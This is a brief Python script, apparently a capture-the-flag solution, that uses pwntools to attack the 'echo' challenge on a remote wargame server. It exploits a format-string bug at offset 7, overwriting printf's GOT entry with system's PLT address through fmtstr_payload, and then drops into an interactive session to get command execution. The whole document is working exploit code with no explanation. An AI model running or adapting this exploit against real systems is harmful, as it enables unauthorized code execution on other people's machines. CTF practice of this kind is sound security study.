from pwn import * 

#p = process('./echo')
p = remote('hackme.inndy.tw',7711)
elf = ELF('./echo')
offset = 7
printf_got = elf.got['printf']
system_addr = elf.plt['system']
print hex(system_addr)
payload = fmtstr_payload(offset,{printf_got:system_addr})
p.sendline(payload)

p.interactive()